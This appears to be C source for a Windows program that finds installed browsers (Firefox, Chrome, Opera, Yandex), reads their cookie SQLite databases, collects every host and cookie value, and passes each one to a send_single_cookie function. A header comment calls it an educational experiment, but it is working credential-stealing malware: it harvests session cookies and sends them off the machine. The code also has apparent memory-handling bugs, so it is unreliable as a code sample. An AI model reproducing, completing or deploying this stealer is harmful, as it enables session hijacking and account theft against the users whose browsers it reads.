/*
@
    - Browser's cookies experiment field.
    - Was written just in education pourpose.
    ^ I personally don't like the previous version.
@ 
*/

#include "main.h"

#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <sqlite3.h>
#include <windows.h>

#ifndef CH_TYPE
#define CH_TYPE 1

#ifndef FF_TYPE
#define FF_TYPE 2

#endif
#endif

#define LOG_SHOW


/* Global cookies array and it's offset for callback.
*/
uint32_t          offset = 0;
cookies_datatype* local_container;


int main(void)
{
    char  username[50];
    DWORD username_size = sizeof(username);

    if (!(GetUserName (username, &username_size)))
        return -1;

    uint16_t user_path_size = strlen("C:\\Users\\\\") + strlen(username);
    char     user_path[user_path_size];

    /* Set local user path. */
    sprintf(user_path, "C:\\Users\\%s\\", username);

    uint16_t local_path_s, roaming_path_s;
    local_path_s   = user_path_size + strlen("AppData\\Local\\");
    roaming_path_s = user_path_size + strlen("AppData\\Roaming\\");

    char roaming_path[roaming_path_s];
    char local_path[local_path_s];

    /* Get and set roaming and local pathes. */
    sprintf(roaming_path, "%sAppData\\Roaming\\", user_path);
    sprintf(local_path, "%sAppData\\Local\\", user_path);

    /* Here we'll check what browsers are installed already. */
    browser_prediction local_machine;
    local_machine = check_browsers(local_path, roaming_path);
    local_machine.user_path = (char *)malloc(sizeof(user_path) + 1);
    strcpy(local_machine.user_path, user_path);


    #ifndef LOG_SHOW
    /* Output status for test pourpose. */
    printf("FF: %d\nCH: %d\nOP: %d\nYA: %d\n", 
        local_machine.FF, local_machine.CH,
        local_machine.OP, local_machine.YA);

    #endif

    /* Here we go. */
    local_container = calloc(1, sizeof(cookies_datatype));
    collect_data(local_machine);

    #ifndef LOG_SHOW
    /* Just in case. */
    for (int i = 0; i < offset; i++)
    {
        printf("[%d] host: %s, value: %s\n",
            i,
            local_container[i].host,
            local_container[i].value);
    }

    #endif

    /* Execute send function for every cookie pair. */
    uint8_t status;
    for (int i = 0; i < offset; i++)
    {
        status = send_single_cookie(&local_container[i]);
        if (!status)
            break;
    }

    return 0;
}


/* Reads directory and puts it's files in the array of char*'s.
*/
void dir_reader(const char* directory, char** files)
{
    DIR           *dir;
    struct dirent *entry;

    if ((dir = opendir(directory)) != NULL)
    {
        int i = 0;
        for (; (entry = readdir(dir)) != NULL; i++)
        {
            files[i] = (char *)malloc(sizeof(entry->d_name));
            strcpy(files[i], entry->d_name);
        }
        closedir(dir);
        files[i] = NULL;
    }
    else
        files[0] = NULL;
}


/* Check if some file is in directory or not.
*/
uint8_t check_file_in_dir(char* filename, const char* dir)
{
    char* files[256];
    dir_reader(dir, files);

    if (files[0] == NULL)
        return 0;

    for (int i = 0; files[i]; i++)
        if (!(strcmp(filename, files[i])))
        {
            free(files);
            return 1;
        }

    free(files);
    return 0;
}


/* This function will get full Firefox cookie db file,
   bacause there are different directories with random names.
*/
char* get_ff_cookies_path(char* curr_path)
{
    char*   files[24];
    char*   full_path;
    uint8_t found;

    dir_reader(curr_path, files);
    full_path = (char *)malloc(sizeof(curr_path) * 2);

    if (files[0] == NULL)
    {
        free(full_path);
        return NULL;
    }

    for (int i = 0; files[i]; i++)
    {
        strcpy(full_path, curr_path);
        strcat(full_path, files[i]);

        found = check_file_in_dir("cookies.sqlite", full_path);
        if (found)
        {
            strcat(full_path, "\\cookies.sqlite");
            return full_path;
        }
    }

    free(full_path);
    return NULL;
}


/* Will check an avaible browsers on this local machine.
   Type browser_prediction defined in 'main.h'.
*/
browser_prediction check_browsers(char* local, char* roaming)
{
    browser_prediction status;
    status.FF = check_file_in_dir("Mozilla", roaming);
    status.CH = check_file_in_dir("Google", local);
    status.OP = check_file_in_dir("Opera Software", roaming);
    status.YA = check_file_in_dir("Yandex", local);

    return status;
}


/* Collect SQL data from databases of browser's cookies.
*/
void collect_data(browser_prediction status)
{
    char* full_path = (char *)malloc(sizeof(status.user_path) + sizeof(YA_PATH) + 1);
    char* ff_path   = (char *)malloc((sizeof(status.user_path) + sizeof(FF_PATH)) * 3);

    if (status.FF)
    {
        strcpy(full_path, status.user_path);
        strcat(full_path, FF_PATH);

        strcpy(ff_path, get_ff_cookies_path(full_path));
        get_sql(ff_path, FF_TYPE);
    }

    if (status.CH)
    {
        strcpy(full_path, status.user_path);
        strcat(full_path, CH_PATH);
        get_sql(full_path, CH_TYPE);
    }

    if (status.OP)
    {
        strcpy(full_path, status.user_path);
        strcat(full_path, OP_PATH);
        get_sql(full_path, CH_TYPE);
    }

    if (status.YA)
    {
        strcpy(full_path, status.user_path);
        strcat(full_path, YA_PATH);
        get_sql(full_path, CH_TYPE);
    }
}


/* Callback function for SQL request to the database.
*/
static int callback(void* bt, int argc, char** argv, char **colname)
{
    for (int i = 0; i < argc; i++)
    {
        if (!(strcmp(colname[i], "host_key")) || !(strcmp(colname[i], "host")))
            strcpy(local_container[offset].host, argv[i]);

        else if (!(strcmp(colname[i], "encrypted_value")) || !(strcmp(colname[i], "value")))
            strcpy(local_container[offset].value, argv[i]);
    }

    local_container[offset].b_type = *((uint8_t *)bt);
    local_container = realloc(local_container, sizeof(cookies_datatype) * (offset + 2));

    offset++;
    return 0;
}


/* Will get data from SQL database and 'll put it in container.
*/
void get_sql(const char* sql_path, uint8_t bt)
{
    sqlite3* database;
    char*    err        = 0;
    int      s_code;
    char     request[50];

    s_code = sqlite3_open(sql_path, &database);

    if (bt == CH_TYPE) {
        strcpy(request, "SELECT * from cookies");
    } 
    else if (bt == FF_TYPE) {
        strcpy(request, "SELECT * from moz_cookies");
    } 
    else {
        return;
    }

    s_code = sqlite3_exec(database, request, callback, (void *)&bt, &err);
    sqlite3_close(database);
}
